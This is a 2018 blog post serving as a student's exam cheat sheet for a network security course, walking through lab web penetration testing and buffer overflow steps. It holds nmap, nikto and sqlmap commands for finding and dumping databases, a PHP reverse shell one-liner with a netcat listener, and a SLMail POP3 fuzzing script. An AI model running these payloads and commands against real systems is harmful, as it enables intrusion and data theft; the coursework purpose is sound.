---
layout: post
title: How to Hack (QUT CAB441 Cheat Sheet)
byline: My cheat sheets and preparation heading into the CAB441 Network Security exam.
date: 2018-10-29
tags: [ infosec ]
comments: false
---

## Purpose of this post
This cheat sheet is the main resource coming in with me into my CAB441 Network Security exam. As we have access to the internet, it was encouraged to create a sheet that would be readily accessible and CTRL-F-able.

## Table of contents
This sheet has been broken up into sections to match the three exam questions. Click any of the links in this table to quickly navigate to that section of the sheet.

1. Network Security
2. Web Penetration Testing
3. Exploiting Buffer Overflows


## Network Security

## Web Penetration Testing

### Resources

1. [Web Penetration Writeup](https://blog.vonhewitt.com/2017/09/tophatsec-freshly-vulnhub-writeup/): 
    A pen-test walk-through, *eerily* mirroring the web penetration testing practical.

2. [SQL Injection Cheat Sheet](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/#ByPassingLoginScreens):
    The SQL injection cheat sheet used in the aforementioned walkthrough.

3. [nmap Cheat Sheet](https://hackertarget.com/nmap-cheatsheet-a-quick-reference-guide/):
    Simple `nmap` cheat sheet. The command `man nmap` is also very useful.


4. [nikto Cheat Sheet](https://duckduckgo.com/?q=nikto+cheat+sheet&atb=v138-7__&ia=cheatsheet&iax=cheatsheet): 
    Nikto scanner cheat sheet. `man nikto` can also be used on Kali.


5. [sqlmap Cheat Sheet](https://www.security-sleuth.com/sleuth-blog/2017/1/3/sqlmap-cheat-sheet)
    Sqlmap scanner cheat sheet. `man sqlmap` can also be used on Kali.

### Steps

1. Identify the devices by performing a ping scan.

    ```bash
      nmap <network>/24 -sn
    ```

2. After finding the devices, perform a service / port scan for each device.

    ```bash
      nmap <device> -sV
    ```

3. Since this is a web penetration test, use the results of the previous `nmap` scan to find which device is running a `http` or `ssl/http` service. These are typically on ports `80`, `433` or `8080` and contain words like `httpd`, `Apache`, etc.

4. When the target device has been identified, visit the pages in a web browser to see what's there. Alternatively, this could be done with the `curl` command. Check for common directories and files like `/login`, `sitemap.xml` and `robots.txt`.

5. If nothing in particular stands out from an initial inspection, use the `nikto` command to perform a more thorough inspection.

    ```bash
      nikto -host <target>
    ```

    Try running `nikto` with different tuning options. To focus on SQL Injection use the command

    ```bash
      nikto -host <target> -Tuning 9
    ```

    For more help with `nikto`, refer to `nikto -h` or `man nikto`.

    Note: Nikto is self described as being not stealthy, if stealth is your goal it may pay to spend more time on Step 4.

6. Nikto will return a bunch of information relating to your query. Most likely you'll see a bunch of directories and files on the server that may be of interest. You should inspect these files and look for any **SQL injection** opportunities.

7. When a page with a form or endpoint that is vulnerable to SQL injection is found, use the `sqlmap` tool to perform an attack.

    ```bash
      sqlmap -u "<url>" --wizard
    ```

    For the list of databases:
    ```bash
      sqlmap -u "<url>" --dbs
    ```

    For the tables in a database:
    ```bash
      sqlmap -u "<url>" --tables -D <database>
    ```

    For the contents of a table:
    ```bash
      sqlmap -u "<url>" --dump -D <database> -T <table>
    ```

8. Get a reverse shell! 

    The steps to get a reverse shell will depend on the content of the database. In the case of the practical, finding the contents of the database allowed you to log into the wordpress site that was present. After logging in, a php reverse shell script could easily be added to the site.

### Tips

1. Try accessing the site using different protocols. `https://` and `http://` are often used to show different things. 

2. `sqlmap` can often take ages, but it stores data to disk as it goes. So if you perform a keyboard interrupt you can often get right back to where you were.

3. The default table name for a Wordpress site is `wordpress8080`

4. The Wordpress admin page lives as `/admin`

5. [This gist](https://gist.github.com/rshipp/eee36684db07d234c1cc) shows an easy way to get a reverse PHP shell

    ```php
    <?php 
      exec("/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.10/1234 0>&1'"); 
      ?>
    ```

    Before visiting the page, you should set up the listener.

    ```bash
    nc -nlvp 1234
    ```

6. Since the `POST` method doesn't show the data as query parameters, you will have to use the `--data` option of `sqlmap`. More information on using `sqlmap` with `POST` can be found [here](https://www.binarytides.com/using-sqlmap-with-login-forms/).

7. John the Ripper is a useful piece of software in Kali that can crack passwords.

## Exploiting Buffer Overflows

### Resources

Before attempting a buffer overflow, you should read up on how the CPU works on a low level.
1. [Program Counter / Instruction Pointer](https://en.wikipedia.org/wiki/Program_counter) 
2. [Call Stack](https://en.wikipedia.org/wiki/Call_stack)
3. [Buffer Overflow Overview](http://www.cse.scu.edu/~tschwarz/coen152_05/Lectures/BufferOverflow.html)
4. [SLMail Buffer Overflow Tutorial](https://www.hugohirsh.com/?p=509)

### Steps

1. Setup the machine with the vulnerability and open Immunity Debugger.

2. Attach Immunity Debugger to the application and start it up.

3. Determine how to cause the buffer overflow - you will most likely be told. When you know, you can start to fuzz the input to cause a crash. The following script was used for SLMail and comes from [here](https://www.hugohirsh.com/?p=509).

    ```python
    !/usr/bin/python
     
    import socket
     
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     
    buffer = "A" * 100
     
    while len(buffer) <= 4000:
        try:
            print"\nSending pwnicorns and rainbows...\n"
            print "We are fuzzing with a length of %s bytes" % len(buffer)
            s.connect(('<address>', 110))
            data = s.recv(1024)
            s.send('USER user ' + '\r\n')
            data = s.recv(1024)
            s.send('PASS ' + buffer + '\r\n')
            data = s.recv(1024)
            s.close()
            print"\nDone! Wonder if we got that shell back?"
            buffer += 200
        except:
            print "Could not connect to POP3 for some reason..."
    ```

4. Determine what part of the message ends up in the EIP / instruction pointer / program counter. This can be done by changing the letters at certain locations and re-performing the crash. See the SLMail tutorial for more info.
